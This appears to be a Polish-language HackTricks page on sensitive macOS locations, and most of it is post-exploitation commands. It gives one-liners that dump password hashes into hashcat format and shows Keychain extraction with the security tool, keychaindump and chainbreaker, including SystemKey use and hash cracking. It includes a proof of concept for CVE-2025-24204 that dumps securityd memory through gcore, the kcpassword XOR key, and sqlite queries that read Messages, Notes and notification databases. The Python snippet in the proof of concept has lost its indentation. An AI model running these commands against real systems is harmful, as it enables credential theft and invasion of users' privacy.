# Wrażliwe lokalizacje macOS i interesujące demony

{{#include ../../../banners/hacktricks-training.md}}

## Hasła

### Hasła Shadow

Informacje o shadow password są przechowywane wraz z konfiguracją użytkownika w plikach plist znajdujących się w **`/var/db/dslocal/nodes/Default/users/`**.\
Poniższy oneliner może być użyty do zrzutu **wszystkich informacji o użytkownikach** (łącznie z informacjami o hashach):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) mogą być użyte do przekształcenia hasha do **hashcat** **format**.

Alternatywny one-liner, który zrzuci creds dla wszystkich non-service accounts w hashcat format `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Inny sposób na uzyskanie `ShadowHashData` użytkownika to użycie `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Ten plik jest **używany tylko** gdy system działa w **trybie pojedynczego użytkownika** (czyli niezbyt często).

### Zrzut Keychain

Zauważ, że podczas używania binarki security do **zrzutu odszyfrowanych haseł**, pojawi się kilka monitów proszących użytkownika o pozwolenie na tę operację.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Na podstawie tego komentarza [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) wygląda na to, że te narzędzia nie działają już w Big Sur.

### Omówienie Keychaindump

Narzędzie o nazwie **keychaindump** zostało opracowane w celu wyodrębniania haseł z macOS keychain, jednak napotyka ograniczenia w nowszych wersjach macOS, takich jak Big Sur, jak wskazano w [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Użycie **keychaindump** wymaga, aby atakujący uzyskał dostęp i podniósł uprawnienia do **root**. Narzędzie wykorzystuje fakt, że keychain jest domyślnie odblokowywany po logowaniu użytkownika w celach wygody, co pozwala aplikacjom na dostęp bez wielokrotnego żądania hasła użytkownika. Jeśli jednak użytkownik zdecyduje się blokować swój keychain po każdym użyciu, **keychaindump** staje się nieskuteczny.

**Keychaindump** działa, celując w konkretny proces o nazwie **securityd**, opisywany przez Apple jako demon odpowiedzialny za autoryzację i operacje kryptograficzne, kluczowy do dostępu do keychain. Proces wyodrębniania obejmuje zidentyfikowanie **Master Key** pochodzącego od hasła logowania użytkownika. Ten klucz jest niezbędny do odczytania pliku keychain. Aby znaleźć **Master Key**, **keychaindump** skanuje stertę pamięci procesu **securityd** przy użyciu polecenia `vmmap`, szukając potencjalnych kluczy w obszarach oznaczonych jako `MALLOC_TINY`. 

Do sprawdzenia tych miejsc w pamięci używa się następującego polecenia:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Po zidentyfikowaniu potencjalnych master keys, **keychaindump** przeszukuje sterty w poszukiwaniu konkretnego wzorca (`0x0000000000000018`), który wskazuje kandydata na master key. Dalsze kroki, w tym deobfuscation, są wymagane, aby wykorzystać ten klucz, jak opisano w kodzie źródłowym **keychaindump**. Analitycy skupiający się na tym obszarze powinni zauważyć, że kluczowe dane potrzebne do odszyfrowania keychain są przechowywane w pamięci procesu **securityd**. Przykładowe polecenie uruchomienia **keychaindump** to:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) może być użyty do wyekstrahowania następujących rodzajów informacji z OSX keychain w sposób forensycznie poprawny:

- Zahashowane hasło Keychain, nadające się do łamania za pomocą [hashcat](https://hashcat.net/hashcat/) lub [John the Ripper](https://www.openwall.com/john/)
- Hasła internetowe
- Hasła ogólne
- Klucze prywatne
- Klucze publiczne
- Certyfikaty X509
- Bezpieczne notatki
- Hasła Appleshare

Mając hasło odblokowujące Keychain, klucz główny uzyskany za pomocą [volafox](https://github.com/n0fate/volafox) lub [volatility](https://github.com/volatilityfoundation/volatility), albo plik odblokowujący taki jak SystemKey, Chainbreaker zwróci również hasła w postaci jawnej.

Bez użycia którejkolwiek z tych metod odblokowania Keychain, Chainbreaker wyświetli wszystkie pozostałe dostępne informacje.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) za pomocą SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) za pomocą memory dump**

[Postępuj zgodnie z tymi krokami](../index.html#dumping-memory-with-osxpmem) aby wykonać **memory dump**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Zrzut kluczy keychain (z hasłami) przy użyciu hasła użytkownika**

Jeśli znasz hasło użytkownika, możesz je użyć do **zrzucenia i odszyfrowania keychains należących do tego użytkownika**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain master key przez uprawnienie `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) zawierał `/usr/bin/gcore` z **`com.apple.system-task-ports.read`** uprawnieniem, więc każdy lokalny administrator (lub złośliwa podpisana aplikacja) mógł zrzucić **pamięć dowolnego procesu nawet przy włączonym SIP/TCC**. Zrzucenie `securityd` leaks the **Keychain master key** in clear i pozwala odszyfrować `login.keychain-db` bez hasła użytkownika.

**Szybkie odtworzenie na podatnych wersjach (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Podaj wyodrębniony klucz szesnastkowy do Chainbreaker (`--key <hex>`), aby odszyfrować login keychain. Apple usunął to uprawnienie w **macOS 15.3+**, więc działa to tylko na niezałatanych buildach Sequoia lub na systemach, które zachowały podatny plik binarny.

### kcpassword

Plik **kcpassword** zawiera **hasło logowania użytkownika**, ale tylko jeśli właściciel systemu **włączył automatyczne logowanie**. W takim przypadku użytkownik zostanie automatycznie zalogowany bez proszenia o hasło (co nie jest zbyt bezpieczne).

Hasło jest przechowywane w pliku **`/etc/kcpassword`** xored z kluczem **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
To sprawia, że hasło jest dość łatwe do odzyskania, na przykład za pomocą skryptów takich jak [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interesujące informacje w bazach danych

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Powiadomienia

Dane powiadomień znajdziesz w `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Większość interesujących informacji znajduje się w **blob**. Będziesz więc musiał **wyodrębnić** tę zawartość i **przekształcić** ją na **czytelną** **dla** **człowieka** lub użyć **`strings`**. Aby uzyskać do niego dostęp, możesz wykonać:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Najnowsze problemy z prywatnością (NotificationCenter DB)

- W macOS **14.7–15.1** Apple przechowywał treść banerów w `db2/db` SQLite bez odpowiedniego zaciemnienia. CVEs **CVE-2024-44292/44293/40838/54504** pozwalały dowolnemu lokalnemu użytkownikowi odczytać tekst powiadomień innych użytkowników po prostu przez otwarcie DB (no TCC prompt). Naprawione w **15.2** przez przeniesienie/zablokowanie DB; na starszych systemach powyższa ścieżka nadal leaks najnowsze powiadomienia i załączniki.
- Baza danych jest world-readable tylko w dotkniętych buildach, więc when hunting on legacy endpoints skopiuj ją przed aktualizacją, aby zachować artefakty.

### Notatki

Notatki użytkowników **notes** znajdują się w `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Preferencje

W aplikacjach macOS preferencje znajdują się w **`$HOME/Library/Preferences`** a w iOS są w `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

W macOS narzędzie CLI **`defaults`** może być użyte do **modyfikacji pliku Preferencji**.

**`/usr/sbin/cfprefsd`** obsługuje usługi XPC `com.apple.cfprefsd.daemon` i `com.apple.cfprefsd.agent` i może być wywołany, aby wykonać działania takie jak modyfikacja preferencji.

## OpenDirectory permissions.plist

Plik `/System/Library/OpenDirectory/permissions.plist` zawiera uprawnienia stosowane do atrybutów węzłów i jest chroniony przez SIP.\
Ten plik przyznaje uprawnienia konkretnym użytkownikom według UUID (a nie uid), dzięki czemu mogą oni uzyskać dostęp do określonych wrażliwych informacji, takich jak `ShadowHashData`, `HeimdalSRPKey` i `KerberosKeys` między innymi:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Powiadomienia systemowe

### Powiadomienia Darwina

Głównym daemonem obsługującym powiadomienia jest **`/usr/sbin/notifyd`**. Aby otrzymywać powiadomienia, klienci muszą zarejestrować się przez port Mach `com.apple.system.notification_center` (sprawdź ich za pomocą `sudo lsmp -p <pid notifyd>`). Demon można skonfigurować za pomocą pliku `/etc/notify.conf`.

Nazwy używane dla powiadomień są unikalnymi notacjami odwrotnego DNS i gdy powiadomienie zostanie wysłane do jednej z nich, klienci, którzy zadeklarowali, że potrafią je obsłużyć, je otrzymają.

Można zrzucić aktualny status (i zobaczyć wszystkie nazwy) wysyłając sygnał SIGUSR2 do procesu notifyd i odczytując wygenerowany plik: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Rozproszony system powiadomień (Distributed Notification Center)

The **Distributed Notification Center** whose main binary is **`/usr/sbin/distnoted`**, is another way to send notifications. It exposes some XPC services and it performs some check to try to verify clients.

### Powiadomienia Apple Push (APN)

W tym przypadku aplikacje mogą rejestrować się na **tematy (topics)**. Klient wygeneruje token, łącząc się z serwerami Apple za pośrednictwem **`apsd`**.\
Następnie dostawcy (providers) również wygenerują token i będą mogli połączyć się z serwerami Apple, aby wysyłać wiadomości do klientów. Te wiadomości zostaną lokalnie odebrane przez **`apsd`**, które przekaże powiadomienie do oczekującej aplikacji.

Ustawienia znajdują się w `/Library/Preferences/com.apple.apsd.plist`.

Istnieje lokalna baza danych wiadomości znajdująca się w macOS w `/Library/Application\ Support/ApplePushService/aps.db` i w iOS w `/var/mobile/Library/ApplePushService`. Zawiera 3 tabele: `incoming_messages`, `outgoing_messages` i `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Można też uzyskać informacje o demonie i połączeniach, używając:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Powiadomienia użytkownika

Są to powiadomienia, które użytkownik powinien zobaczyć na ekranie:

- **`CFUserNotification`**: To API zapewnia sposób wyświetlenia na ekranie wyskakującego okienka z komunikatem.
- **The Bulletin Board**: Wyświetla w iOS baner, który znika i zostaje zapisany w Notification Center.
- **`NSUserNotificationCenter`**: Jest to iOS bulletin board w macOS. Baza danych z powiadomieniami znajduje się w `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Referencje

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
